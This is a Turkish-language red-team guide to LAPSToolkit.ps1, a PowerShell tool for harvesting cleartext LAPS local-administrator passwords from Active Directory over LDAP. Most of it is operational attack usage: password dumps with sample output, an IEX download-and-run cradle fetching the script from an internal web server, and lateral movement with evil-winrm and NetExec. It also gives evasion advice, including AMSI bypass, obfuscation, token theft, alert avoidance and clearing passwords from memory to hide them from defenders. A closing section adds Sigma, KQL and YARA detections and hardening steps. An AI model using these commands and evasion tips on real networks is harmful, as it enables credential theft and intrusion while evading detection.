# LAPSToolkit.ps1

> **Kategori:** [12. NTDS.dit, GPO Şifreleri ve LAPS Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Active Directory ortamlarında Microsoft LAPS (Local Administrator Password Solution) altyapısını denetleyen, yetki devri açıklarını haritalayan ve okunabilir `ms-Mcs-AdmPwd` yerel yönetici parolalarını LDAP üzerinden hasat eden PowerShell aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında yanal hareket saldırılarını (özellikle Pass-the-Hash) engellemek amacıyla geliştirilen Microsoft LAPS (Local Administrator Password Solution), her etki alanı üyesi bilgisayarın yerel `Administrator` parolasını periyodik olarak rastgele üretir ve benzersiz kılar. LAPS mimarisi (eski / Legacy LAPS), bilgisayar nesnelerinin Active Directory şemasında iki özel öznitelik barındırmasını sağlar:
* `ms-Mcs-AdmPwd`: İstemcinin geçerli yerel yönetici parolasını **düz metin (cleartext)** olarak saklar.
* `ms-Mcs-AdmPwdExpirationTime`: Parolanın geçerlilik süresinin dolacağı zaman damgasını tutar.

Tasarım gereği `ms-Mcs-AdmPwd` özniteliği hassas (confidential) bir özniteliktir ve yalnızca Active Directory üzerinde açıkça "All Extended Rights" veya özel LAPS okuma hakkı (`Set-AdmPwdReadPasswordPermission`) verilmiş yetkili gruplar (örn: `Domain Admins`, `LAPS Admins`) tarafından okunabilmelidir. Ancak gerçek dünya etki alanı yapılarında:
1. Organizasyonel Birim (OU) bazında yapılan denetimsiz yetki devirleri (`Delegation of Control`),
2. Standart kullanıcılara veya `Authenticated Users` grubuna farkında olmadan verilen "Read All Properties" hakları,
3. Destek (HelpDesk) ekiplerine aşırı genişletilmiş okuma yetkilerinin tanımlanması
nedeniyle düşük yetkili standart domain kullanıcıları da bu özniteliği okuyabilir hale gelir.

**LAPSToolkit.ps1** (Sean Metcalf / @PyroTek3 tarafından geliştirilmiştir), LAPS yapılandırmasını ve yetkilendirmelerini derinlemesine analiz eden bir PowerShell aracıdır. Araç, etki alanı denetleyicisi ile standart LDAP/ADSI üzerinden konuşarak:
* Mevcut kullanıcının okuma iznine sahip olduğu tüm LAPS parolalarını düz metin olarak çıkarır (`Get-LAPSComputers`).
* Etki alanında hangi kullanıcı veya gruplara LAPS parolalarını okuma yetkisi devredildiğini haritalandırır (`Find-LAPSDelegatedGroups`).

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                           LAPSTOOLKIT MIMARI AKIŞI                                |
+-----------------------------------------------------------------------------------+
  [Domain Kullanıcısı / Denetçi]                     [Domain Controller (DC)]
     (LAPSToolkit.ps1)                                  (LDAP / AD Veritabanı)
             |                                                    |
             |--- 1. LDAP Bind (Port 389/636) ------------------->|
             |       [Mevcut Windows Kimlik Doğrulaması]          |
             |                                                    |--- 2. Şema ve DACL
             |--- 2. Find-LAPSDelegatedGroups ------------------->|       Denetimi
             |       (OU ve Bilgisayar ACL'leri taranır)          |
             |<-- 3. Yetkili Grupların Listesi Döner -------------|
             |                                                    |
             |--- 4. Get-LAPSComputers (LDAP Query) ------------->|--- 3. Filtre Çalışır:
             |       Filter: (ms-Mcs-AdmPwd=*)                    |       (ms-Mcs-AdmPwd=*)
             |                                                    |
             |<-- 5. Bilgisayar Nesneleri ve Açık Parolalar ------|
             |
             v
  [Çıktı Tablosu]:
  ├── ComputerName : WKSTN-FIN-01.corp.local
  ├── Password     : %p9#L2k!xM81aQ
  └── Expiration   : 11/15/2026 10:30:00 AM
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Araçlara Üstünlüğü |
| :--- | :--- | :--- |
| **Düz Metin Parola Hasadı** | Hash kırma veya bellek dökümü gerektirmez. | Doğrudan hedef makinelerin yerel yönetici parolasını sağlar. |
| **Yetki Devri Haritalama** | Hangi grupların şifreleri okuyabildiğini listeler. | Güvenlik açığı olan OU'ları ve hedeflenecek grupları gösterir. |
| **Tamamen Dosyasız ve Yerleşik**| Standart .NET ADSI / System.DirectoryServices kullanır.| RSAT veya LAPS resmi DLL kütüphanelerine ihtiyaç duymaz. |
| **Sessiz LDAP Trafiği** | Yalnızca meşru Active Directory sorguları üretir. | Uç noktalara veya hedef bilgisayarlara doğrudan paket atmaz. |
| **Esnek Filtreleme** | Belirli bir OU veya tekil bilgisayarı hedefleyebilir. | Kapsamı daraltarak gereksiz LDAP gürültüsünü önler. |

### Karşılaştırma Tablosu

| Özellik | LAPSToolkit.ps1 | pyLAPS | SharpLAPS | NetExec (`--laps`) |
| :--- | :--- | :--- | :--- | :--- |
| **Çalışma Ortamı** | Windows (PowerShell) | Linux / Windows (Python) | Windows (.NET C#) | Linux / Windows (Python) |
| **Protokol** | LDAP / ADSI | LDAP (ldap3 kütüphanesi) | LDAP (System.DirectoryServices) | LDAP / SMB |
| **Delegasyon Analizi** | Var (`Find-LAPSDelegatedGroups`) | Yok (Sadece parola çeker) | Yok (Sadece parola çeker) | Yok (Sadece parola çeker) |
| **Bellekte Yürütme** | Evet (IEX / Dot-source) | Hayır (Python script) | Evet (`execute-assembly`) | Hayır |
| **Yeni Windows LAPS Desteği**| Kısıtlı (Legacy odaklı) | Kısıtlı | Gelişmiş derlemelerde var | Kısmi |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

LAPSToolkit yüklendikten sonra iki temel cmdlet ile yönetilir: `Get-LAPSComputers` ve `Find-LAPSDelegatedGroups`.

```powershell
Get-LAPSComputers [-TargetOU <OU_DN>] [-ComputerName <FQDN>] [-Domain <Domain>]
Find-LAPSDelegatedGroups [-TargetOU <OU_DN>] [-Domain <Domain>]
```

### Desteklenen Kritik Bayraklar

| Parametre | Cmdlet | Açıklama | Örnek Kullanım |
| :--- | :--- | :--- | :--- |
| `-TargetOU` | Her ikisi | Yalnızca belirtilen Organizasyonel Birim altındaki sistemleri sorgular. | `-TargetOU "OU=Servers,DC=corp,DC=local"` |
| `-ComputerName` | `Get-LAPSComputers` | Yalnızca belirtilen bilgisayar nesnesinin LAPS parolasını çeker. | `-ComputerName "SRV-APP01"` |
| `-Domain` | Her ikisi | Sorgunun yönlendirileceği hedef etki alanının FQDN adı. | `-Domain "child.corp.local"` |
| `-Verbose` | Her ikisi | LDAP arama filtrelerini ve nesne tarama detaylarını ekrana basar. | Bayrak |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Etki Alanındaki Tüm LAPS Parolalarını Listeleme
Mevcut kullanıcının okuma yetkisine sahip olduğu tüm bilgisayarların yerel yönetici parolalarını toplu olarak çekme:

```powershell
Get-LAPSComputers
```

**Konsol Çıktı Analizi:**
```
ComputerName : WKSTN-HR-01.corp.local
Password     : &9aK!mX7#pQ12
Expiration   : 11/02/2026 14:00:22

ComputerName : SRV-SQL-DEV.corp.local
Password     : Zx8#Lm!190PaQ
Expiration   : 10/28/2026 09:12:45

[+] Successfully retrieved 2 computer passwords.
```

### Senaryo 2: Belirli Bir Sunucunun LAPS Parolasını ve Bitiş Süresini Sorgulama
Hedeflenen tek bir sunucunun parolasını çekerek yanal hareket öncesi doğrulama yapma:

```powershell
Get-LAPSComputers -ComputerName "SRV-BACKUP01"
```

**Konsol Çıktı Analizi:**
```
ComputerName : SRV-BACKUP01.corp.local
Password     : B@ckupAdmin99!
Expiration   : 11/12/2026 16:30:10
```

### Senaryo 3: Belirli Bir OU Altındaki Sistemleri Filtreleme (`-TargetOU`)
Yalnızca sunucu veya belirli bir departman birimi altındaki makineleri hedef alma:

```powershell
Get-LAPSComputers -TargetOU "OU=Workstations,OU=Finance,DC=corp,DC=local"
```

**Konsol Çıktı Analizi:**
```
ComputerName : FIN-WS-001.corp.local
Password     : F1n@ncePass2026
Expiration   : 12/01/2026 08:00:00
```

### Senaryo 4: LAPS Parolalarını Okuma Yetkisi Verilmiş Grupları Keşfetme
ACL'leri tarayarak hangi kullanıcı ve gruplara parola okuma yetkisinin devredildiğini tespit etme:

```powershell
Find-LAPSDelegatedGroups
```

**Konsol Çıktı Analizi:**
```
DelegatedGroup : CORP\HelpDesk-Tier1
TargetOU       : OU=Workstations,DC=corp,DC=local
Permission     : Read Extended Right (ms-Mcs-AdmPwd)

DelegatedGroup : CORP\Interns  <-- HATALI YETKİLENDİRME (STJYER GRUBU)
TargetOU       : OU=Laptops,DC=corp,DC=local
Permission     : All Extended Rights
```

### Senaryo 5: Elde Edilen LAPS Parolalarını CSV Dosyasına Dışa Aktarma
Operasyonel dokümantasyon veya parola listesi oluşturmak için sonuçları CSV'ye dökme:

```powershell
Get-LAPSComputers | Select-Object ComputerName, Password, Expiration | Export-Csv -Path "C:\Temp\laps_dump.csv" -NoTypeInformation
```

**Konsol Çıktı Analizi:**
```
# Belirtilen CSV dosyası oluşturulur ve tüm şifreler tablo halinde kaydedilir
```

### Senaryo 6: Modülü Web Sunucusundan Doğrudan Belleğe İndirip Çalıştırma (IEX)
Diske hiçbir `.ps1` dosyası yazmadan denetim makinesinden bellek içine yükleyip anında çalıştırma:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/LAPSToolkit.ps1'); Get-LAPSComputers
```

**Konsol Çıktı Analizi:**
```
# Bellek içi yükleme sonrası LAPS parolaları doğrudan konsola dökülür
```

### Senaryo 7: Çözülen LAPS Parolası ile Evil-WinRM Üzerinden Yanal Hareket
Elde edilen yerel yönetici parolasını kullanarak hedef sunucuya WinRM üzerinden oturum açma:

```bash
evil-winrm -i 192.168.1.55 -u .\Administrator -p '&9aK!mX7#pQ12'
```

**Konsol Çıktı Analizi:**
```
Evil-WinRM shell v3.5
Info: Establishing connection to 192.168.1.55:5985
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
srv-sql-dev\administrator  <-- YEREL SYSTEM YÖNETİCİSİ SEVİYESİNDE ERİŞİM
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `Get-LAPSComputers returns no results / empty table` | Kullanıcının `ms-Mcs-AdmPwd` üzerinde "Extended Right" okuma izni yok veya etki alanında LAPS kurulu değil. | `Find-LAPSDelegatedGroups` ile yetkili grupları inceleyin; bu gruplara üye olan bir kullanıcının oturum belirtecini (Token) ele geçirin. |
| `The server cannot be contacted / LDAP Server Down` | DNS çözümleme sorunu veya etki alanı denetleyicisinde LDAP (Port 389/636) kapalı. | `ping <domain>` ile DC erişimini teyit edin; `-Domain` parametresi ile geçerli etki alanı adını açıkça tanımlayın. |
| `Windows LAPS (msLAPS-Password) attribute is missing` | Hedef ortam yeni Windows LAPS (Server 2022 / Win 11) mimarisine geçmiş; `ms-Mcs-AdmPwd` yerine `msLAPS-Password` kullanılıyor. | Yeni Windows LAPS şifrelenmiş veya DAPI korumalı JSON formatındadır; `pyLAPS` veya güncel PowerShell cmdlet'lerini (`Get-LapsPassword`) kullanın. |
| `Script blocked by Antivirus / AMSI` | Windows Defender veya EDR, betik içerisindeki `LAPSToolkit` ve `ms-Mcs-AdmPwd` dizilimini tespit etti. | Bellek içi AMSI atlatma uygulayın veya değişken adlarını karıştırarak (obfuscate) yeniden yükleyin. |
| `An operations error occurred on DirectorySearcher` | LDAP arama sınırları veya çağrılan OU yolu (`TargetOU`) sözdizimsel olarak hatalı. | Distinguished Name (DN) biçimini `OU=Workstations,DC=corp,DC=local` olarak eksiksiz doğrulayın. |
| `Target computer does not have LAPS installed` | Bilgisayar nesnesinde LAPS istemci bileti (AdmPwd.dll) kurulu değil; parola hiç oluşturulmamış. | Yalnızca `ms-Mcs-AdmPwd` değeri dolu olan bilgisayarları hedefleyin (`(ms-Mcs-AdmPwd=*)`). |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: DÜŞÜK - ORTA]
0 ----[3.5 - PASSIVE LDAP SEARCH]---------------------------- 10
  - Ağ Seviyesi: Standart LDAP sorgu trafiği (Port 389/636) - Hedef makineye sıfır paket!
  - Uç Nokta Seviyesi: PowerShell Script Block (4104) ve LDAP Event 1644 sorgu günlükleri
```

### 5.1 Bırakılan İzler (Event Logs)

* **Directory Service Event Log (Event ID 1644 - LDAP Search Logging):**
  * Etki alanı denetleyicisi üzerinde LDAP arama filtreleri denetleniyorsa, `SearchFilter: (ms-Mcs-AdmPwd=*)` veya `(msLAPS-Password=*)` sorgusu loglanır.
* **Windows Security Event ID 4662 (Directory Service Object Access):**
  * Eğer `ms-Mcs-AdmPwd` özniteliği için SACL (System Access Control List) denetimi etkinleştirilmişse, bu özniteliği okuyan hesap günlüğe kaydedilir.
* **Microsoft-Windows-PowerShell/Operational (Event ID 4104 - Script Block Logging):**
  * `Get-LAPSComputers`, `Find-LAPSDelegatedGroups` ve `ms-Mcs-AdmPwd` fonksiyon kodları tam metin olarak günlüğe yazılır.

### 5.2 Ağ ve EDR İmzaları

* **Hedef Makineye Sıfır Dokunuş:**
  LAPSToolkit şifresini çektiği uç noktaya (örneğin `WKSTN-01`) doğrudan tek bir TCP paketi dahi göndermez. Tüm iletişim istemci ile Domain Controller arasındaki meşru LDAP protokolü üzerinden yürütülür.
* **LDAP Tarama Anomalisi:**
  Tek bir kullanıcının kısa sürede etki alanındaki binlerce bilgisayar nesnesinin LAPS özniteliğini sorgulaması, SIEM ve Microsoft Defender for Identity (MDI) sistemlerinde "Reconnaissance via LDAP" olarak raporlanabilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Credential Access** | `T1003` | OS Credential Dumping | LDAP üzerinden düz metin LAPS parolalarını hasat etme. |
| **Discovery** | `T1087.002` | Account Discovery: Domain Account | Parola okuma yetkisine sahip grupları ve hesapları haritalama. |
| **Discovery** | `T1069.002` | Permission Groups Discovery: Domain Groups | `Find-LAPSDelegatedGroups` ile delegasyonları denetleme. |
| **Execution** | `T1059.001` | PowerShell | Analiz ve sorgulama sürecini PowerShell ile yürütme. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **Toplu LDAP Taraması (MDI Uyarısı)** | Tüm etki alanını birden taramak yerine, yalnızca hedeflenen tekil sunucu (`-ComputerName`) sorgulanmalıdır. |
| **PowerShell Script Block (4104)** | Betik yerine doğrudan C# derlenmiş araçlar (`SharpLAPS`) veya Linux tabanlı LDAP sorgulayıcılar (`pyLAPS`) kullanılmalıdır. |
| **LDAP Trafiği Şifrelemesi** | Mümkün olduğunda LDAP trafiğini TLS üzerinden şifrelemek için LDAPS (Port 636) tercih edilmelidir. |
| **Parola Değişkeni Temizliği** | Operasyon bittiğinde PowerShell belleğindeki şifre değişkenleri hemen sıfırlanmalıdır. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: ms-Mcs-AdmPwd LAPS Özniteliğine Şüpheli LDAP Sorgusu
```yaml
title: ms-Mcs-AdmPwd LAPS Ozniteligine Supheli LDAP Taramasi
id: f4a81230-9921-4b12-a812-771239aa4411
status: experimental
description: Domain Controller uzerinde ms-Mcs-AdmPwd veya msLAPS-Password ozniteliklerini hedefleyen olagandisi LDAP arama filtrelerini yakalar.
references:
    - https://attack.mitre.org/techniques/T1003/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    service: directory_service
    product: windows
    definition: 'Directory Service Event ID 1644'
detection:
    selection:
        EventID: 1644
        SearchFilter|contains:
            - 'ms-Mcs-AdmPwd'
            - 'msLAPS-Password'
            - 'msLAPS-EncryptedPassword'
    condition: selection
falsepositives:
    - Mesru LAPS Yonetim Araci (AdmPwd.PS) veya yetkili sistem yoneticileri.
level: high
tags:
    - attack.credential_access
    - attack.t1003
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// PowerShell ScriptBlock loglarinda LAPS sifre cekme fonksiyonlarini tespit eder
Event
| where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
| where RenderedDescription has_any ("Get-LAPSComputers", "Find-LAPSDelegatedGroups", "ms-Mcs-AdmPwd")
| project TimeGenerated, Computer, EventID, RenderedDescription
| order by TimeGenerated desc
```

#### YARA Kuralı: LAPSToolkit PowerShell Kodu İmzası
```yara
rule Threat_Script_PowerShell_LAPSToolkit {
    meta:
        description = "LAPSToolkit PowerShell LAPS hasat betigini tespit eder"
        author = "AD Guvenlik Laboratuvari"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "Get-LAPSComputers" ascii wide nocase
        $s2 = "Find-LAPSDelegatedGroups" ascii wide nocase
        $s3 = "ms-Mcs-AdmPwd" ascii wide nocase
        $s4 = "ms-Mcs-AdmPwdExpirationTime" ascii wide nocase
    condition:
        3 of ($s*)
}
```

#### Sertleştirme (Hardening) Adımları
1. **LAPS Yetki Devri Denetimi:** `Get-AdmPwdReadPasswordPermission` cmdlet'i ile tüm OU'lar taranmalı; standart kullanıcılara veya yetkisiz yardım masası gruplarına verilmiş okuma izinleri derhal kaldırılmalıdır (`Remove-AdmPwdReadPasswordPermission`).
2. **Read All Properties İzinlerinin Sınırlandırılması:** OU erişim denetim listelerinde (ACL) standart `Domain Users` veya `Authenticated Users` grubuna "Read All Properties" hakkı verilmemelidir.
3. **Yeni Windows LAPS'a Geçiş:** Eski (Legacy) LAPS yerine Windows Server 2022 ve Windows 11 ile gelen yerleşik Windows LAPS mimarisine geçilmeli; parola şifreleme ve DAPI koruması etkinleştirilmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Tüm LAPS Parolalarını Düz Metin Listeleme
```powershell
Get-LAPSComputers
```
* **Ne Yapar?:** Okuma izniniz olan tüm bilgisayarların LAPS yerel yönetici parolalarını LDAP'tan çeker.
* **Ne Zaman Kullanılır?:** Etki alanında geniş kapsamlı yerel yönetici erişimi ararken.
* **Parametreler:** Parametresiz çalıştırma.

#### 2. Tekil Bir Bilgisayarın Parolasını Çekme
```powershell
Get-LAPSComputers -ComputerName "SRV-FILE01"
```
* **Ne Yapar?:** Yalnızca belirtilen bilgisayar nesnesinin LAPS şifresini ve son kullanma tarihini getirir.
* **Ne Zaman Kullanılır?:** Belirli bir hedef sunucuya sıçramadan önce şifresini öğrenmek için.
* **Parametreler:** `-ComputerName <Sunucu_Adı>`.

#### 3. Belirli Bir OU Altındaki Sistemleri Sorgulama
```powershell
Get-LAPSComputers -TargetOU "OU=Servers,DC=corp,DC=local"
```
* **Ne Yapar?:** Yalnızca belirtilen Organizasyonel Birim altındaki sunucuların LAPS şifrelerini listeler.
* **Ne Zaman Kullanılır?:** Sadece kritik sunucuların şifrelerini filtrelemek istediğinizde.
* **Parametreler:** `-TargetOU <Distinguished_Name>`.

#### 4. LAPS Yetkili Gruplarını Denetleme
```powershell
Find-LAPSDelegatedGroups
```
* **Ne Yapar?:** Etki alanında hangi kullanıcı ve gruplara LAPS şifrelerini okuma yetkisi verildiğini analiz eder.
* **Ne Zaman Kullanılır?:** Hangi hesapları ele geçirirseniz LAPS şifrelerini okuyabileceğinizi keşfetmek için.
* **Parametreler:** Parametresiz analiz komutu.

#### 5. Sonuçları CSV Formatında Kaydetme
```powershell
Get-LAPSComputers | Export-Csv -Path "C:\Temp\laps.csv" -NoTypeInformation
```
* **Ne Yapar?:** Bulunan tüm bilgisayar ve parola kayıtlarını CSV dosyasına aktarır.
* **Ne Zaman Kullanılır?:** Çıktıları operasyonel raporlamaya veya parola denetim tablolarına eklemek için.
* **Parametreler:** `Export-Csv -NoTypeInformation`.

#### 6. Parolası Yakında Dolacak Sistemleri Filtreleme
```powershell
Get-LAPSComputers | Where-Object { $_.Expiration -lt (Get-Date).AddDays(2) }
```
* **Ne Yapar?:** Parolasının geçerlilik süresi 2 günden az kalan sistemleri ayıklar.
* **Ne Zaman Kullanılır?:** Parola değişmeden önce operasyonel erişim planlaması yaparken.
* **Parametreler:** `Where-Object` tarih karşılaştırması.

#### 7. Dot-Source ile Belleğe Yükleme
```powershell
. .\LAPSToolkit.ps1
```
* **Ne Yapar?:** Betik dosyasını mevcut PowerShell ortamının fonksiyon tablosuna ekler.
* **Ne Zaman Kullanılır?:** Cmdlet'leri komut satırından çağrılabilir hale getirmek için.
* **Parametreler:** PowerShell dot-source sözdizimi.

#### 8. Güvenilen Farklı Bir Etki Alanını Sorgulama
```powershell
Get-LAPSComputers -Domain "child.corp.local"
```
* **Ne Yapar?:** Güven ilişkisi bulunan kardeş veya alt etki alanının LAPS veritabanını sorgular.
* **Ne Zaman Kullanılır?:** Forest çapında çapraz alan denetimlerinde.
* **Parametreler:** `-Domain <Hedef_Domain>`.

#### 9. Çözülen Parola ile NetExec Doğrulaması
```bash
nxc smb 192.168.1.50 -u Administrator -p 'LAPS_PASS_BURAYA' --local-auth
```
* **Ne Yapar?:** Elde edilen parolanın hedef sunucuda yerel Administrator olarak çalıştığını doğrular.
* **Ne Zaman Kullanılır?:** LAPS parolasının doğruluğunu uzaktan teyit etmek için.
* **Parametreler:** `--local-auth` bayrağı.

#### 10. Bellekteki LAPS Parola Değişkenlerini İmha Etme
```powershell
$laps = $null; [GC]::Collect()
```
* **Ne Yapar?:** Bellekte tutulan parola nesnelerini temizler ve çöp toplayıcıyı tetikler.
* **Ne Zaman Kullanılır?:** Bellek analizi yapan savunma araçlarından şifreleri gizlemek için.
* **Parametreler:** `$null` ve `[GC]::Collect()`.

---

## Kaynaklar
* [LAPSToolkit Resmi GitHub Deposu (Sean Metcalf)](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/LAPSToolkit.ps1)
* [Microsoft Dokümantasyonu: Legacy LAPS Overview and Permissions](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/mt227395(v=ws.11))
* [Microsoft Dokümantasyonu: Windows LAPS Architecture and Security](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
* [Microsoft Dokümantasyonu: [MS-ADTS] Active Directory Technical Specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/)
* [MITRE ATT&CK: OS Credential Dumping (T1003)](https://attack.mitre.org/techniques/T1003/)
* [Active Directory Güvenliği: Exploiting LAPS Misconfigurations](https://adsecurity.org/?p=3164)
* [HackTricks: Pentesting LAPS](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#laps)
* [SpecterOps: Microsoft LAPS Operations and Abuses](https://posts.specterops.io/)

---

> **Önceki:** [← Grouper2](./Grouper2.md) · **Sonraki:** [pyLAPS →](./pyLAPS.md)

